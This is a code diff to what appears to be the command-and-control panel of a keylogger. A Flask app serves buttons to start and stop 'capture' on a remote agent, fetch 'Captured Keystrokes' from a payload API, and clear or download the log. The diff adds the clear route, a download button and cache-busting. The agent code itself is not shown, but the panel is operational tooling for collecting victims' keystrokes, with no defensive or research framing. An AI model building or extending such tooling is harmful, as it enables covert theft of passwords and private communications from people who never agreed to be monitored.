@@ -39,14 +39,29 @@ HTML_PAGE = """
             .catch(err => alert("Error: " + err));
         }
 
-        function fetchPeople() {
-            fetch("/people")
-            .then(res => res.text())
-            .then(data => {
-                document.getElementById("people-output").innerText = data || "[No activity captured yet]";
+       function fetchPeople() {
+        const unique = new Date().getTime();  // Unique value to prevent caching
+        fetch("/people?nocache=" + unique)
+        .then(res => res.text())
+        .then(data => {
+        document.getElementById("people-output").innerText = data || "[No activity captured yet]";
+    })
+    .catch(err => alert("Error fetching data: " + err));
+}
+
+
+        function reloadSession() {
+            fetch("/reload", { method: "POST" })
+            .then(() => {
+                document.getElementById("people-output").innerText = "[Log cleared. Start typing again.]";
+                alert("Log cleared");
             })
-            .catch(err => alert("Error fetching data: " + err));
+            .catch(err => alert("Error: " + err));
         }
+        function downloadLog() {
+        window.location.href = "/download";
+         }
+
     </script>
 </head>
 <body>
@@ -54,6 +69,9 @@ HTML_PAGE = """
     <button onclick="controlAgent('start')">Start Capture</button>
     <button onclick="controlAgent('stop')">Stop Capture</button>
     <button onclick="fetchPeople()">Get Captured Data</button>
+    <button onclick="reloadSession()">Reload & Clear Log</button>
+    <button onclick="downloadLog()">Download Log File</button>
+
 
     <h2>Captured Keystrokes</h2>
     <pre id="people-output">[Click "Get Captured Data" to refresh]</pre>
@@ -91,6 +109,15 @@ def people():
     except Exception as e:
         print(f"[ERROR] Failed to get captured data: {e}")
         return "Error getting captured data", 500
+
+@app.route('/reload', methods=['POST'])
+def reload():
+    try:
+        r = requests.post(f"{PAYLOAD_API}/clear", timeout=3)
+        return '', r.status_code
+    except Exception as e:
+        print(f"[ERROR] Failed to clear log: {e}")
+        return str(e), 500
 
 if __name__ == '__main__':
     app.run(debug=False, port=7000)
